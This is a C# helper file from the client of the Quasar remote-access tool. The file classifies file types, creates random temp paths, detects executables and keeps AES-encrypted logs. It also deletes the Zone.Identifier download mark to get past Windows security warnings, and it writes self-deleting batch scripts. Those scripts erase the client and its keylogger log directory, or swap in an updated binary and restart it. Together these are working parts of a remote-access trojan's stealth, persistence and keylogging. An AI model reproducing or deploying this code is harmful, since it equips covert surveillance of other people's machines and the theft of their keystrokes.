using System;
using System.IO;
using System.Text;
using Quasar.Common.Enums;
using Quasar.Common.Utilities;
using xClient.Core.Cryptography;
using xClient.Core.Data;
using xClient.Core.Utilities;

namespace xClient.Core.Helper
{
    public static class FileHelper
    {
        private const string CHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        private static readonly SafeRandom Random = new SafeRandom();

        public static ContentType GetContentType(string fileExtension)
        {
            switch (fileExtension.ToLower())
            {
                default:
                    return ContentType.Blob;
                case ".exe":
                    return ContentType.Application;
                case ".txt":
                case ".log":
                case ".conf":
                case ".cfg":
                case ".asc":
                    return ContentType.Text;
                case ".rar":
                case ".zip":
                case ".zipx":
                case ".tar":
                case ".tgz":
                case ".gz":
                case ".s7z":
                case ".7z":
                case ".bz2":
                case ".cab":
                case ".zz":
                case ".apk":
                    return ContentType.Archive;
                case ".doc":
                case ".docx":
                case ".odt":
                    return ContentType.Word;
                case ".pdf":
                    return ContentType.Pdf;
                case ".jpg":
                case ".jpeg":
                case ".png":
                case ".bmp":
                case ".gif":
                case ".ico":
                    return ContentType.Image;
                case ".mp4":
                case ".mov":
                case ".avi":
                case ".wmv":
                case ".mkv":
                case ".m4v":
                case ".flv":
                    return ContentType.Video;
                case ".mp3":
                case ".wav":
                case ".pls":
                case ".m3u":
                case ".m4a":
                    return ContentType.Audio;
            }
        }

        public static string GetRandomFilename(int length, string extension = "")
        {
            StringBuilder randomName = new StringBuilder(length);
            for (int i = 0; i < length; i++)
                randomName.Append(CHARS[Random.Next(CHARS.Length)]);

            return string.Concat(randomName.ToString(), extension);
        }

        /// <summary>
        /// Creates an unused temp file path. 
        /// </summary>
        /// <param name="extension">The file extension with dot.</param>
        /// <returns>The path to the temp file.</returns>
        public static string GetTempFilePath(string extension)
        {
            while (true)
            {
                string tempFilePath = Path.Combine(Path.GetTempPath(), GetRandomFilename(12, extension));
                if (File.Exists(tempFilePath)) continue;
                return tempFilePath;
            }
        }

        public static bool IsValidExecuteableFile(byte[] block)
        {
            if (block.Length < 2) return false;
            return (block[0] == 'M' && block[1] == 'Z') || (block[0] == 'Z' && block[1] == 'M');
        }

        public static bool DeleteZoneIdentifier(string filePath)
        {
            return NativeMethods.DeleteFile(filePath + ":Zone.Identifier");
        }

        public static string CreateUninstallBatch(bool isFileHidden)
        {
            try
            {
                string batchFile = GetTempFilePath(".bat");

                string uninstallBatch =
                    "@echo off" + "\r\n" +
                    "chcp 65001" + "\r\n" +
                    "echo DONT CLOSE THIS WINDOW!" + "\r\n" +
                    "ping -n 10 localhost > nul" + "\r\n" +
                    "del /a /q /f " + "\"" + ClientData.CurrentPath + "\"" + "\r\n" +
                    "rmdir /q /s " + "\"" + Keylogger.LogDirectory + "\"" + "\r\n" +
                    "del /a /q /f " + "\"" + batchFile + "\"";

                File.WriteAllText(batchFile, uninstallBatch, new UTF8Encoding(false));
                return batchFile;
            }
            catch (Exception)
            {
                return string.Empty;
            }
        }

        public static string CreateUpdateBatch(string newFilePath, bool isFileHidden)
        {
            try
            {
                string batchFile = GetTempFilePath(".bat");

                string updateBatch =
                    "@echo off" + "\r\n" +
                    "chcp 65001" + "\r\n" +
                    "echo DONT CLOSE THIS WINDOW!" + "\r\n" +
                    "ping -n 10 localhost > nul" + "\r\n" +
                    "del /a /q /f " + "\"" + ClientData.CurrentPath + "\"" + "\r\n" +
                    "move /y " + "\"" + newFilePath + "\"" + " " + "\"" + ClientData.CurrentPath + "\"" + "\r\n" +
                    "start \"\" " + "\"" + ClientData.CurrentPath + "\"" + "\r\n" +
                    "del /a /q /f " + "\"" + batchFile + "\"";

                File.WriteAllText(batchFile, updateBatch, new UTF8Encoding(false));
                return batchFile;
            }
            catch (Exception)
            {
                return string.Empty;
            }
        }

        public static string CreateRestartBatch()
        {
            try
            {
                string batchFile = GetTempFilePath(".bat");

                string restartBatch =
                    "@echo off" + "\r\n" +
                    "chcp 65001" + "\r\n" +
                    "echo DONT CLOSE THIS WINDOW!" + "\r\n" +
                    "ping -n 10 localhost > nul" + "\r\n" +
                    "start \"\" " + "\"" + ClientData.CurrentPath + "\"" + "\r\n" +
                    "del /a /q /f " + "\"" + batchFile + "\"";

                File.WriteAllText(batchFile, restartBatch, new UTF8Encoding(false));

                return batchFile;
            }
            catch (Exception)
            {
                return string.Empty;
            }
        }

        /// <summary>
        /// Appends text to a log file.
        /// </summary>
        /// <param name="filename">The filename of the log.</param>
        /// <param name="appendText">The text to append.</param>
        public static void WriteLogFile(string filename, string appendText)
        {
            appendText = ReadLogFile(filename) + appendText;

            using (FileStream fStream = File.Open(filename, FileMode.Create, FileAccess.Write))
            {
                byte[] data = AES.Encrypt(Encoding.UTF8.GetBytes(appendText));
                fStream.Seek(0, SeekOrigin.Begin);
                fStream.Write(data, 0, data.Length);
            }
        }

        /// <summary>
        /// Reads a log file.
        /// </summary>
        /// <param name="filename">The filename of the log.</param>
        public static string ReadLogFile(string filename)
        {
            return File.Exists(filename) ? Encoding.UTF8.GetString(AES.Decrypt(File.ReadAllBytes(filename))) : string.Empty;
        }
    }
}
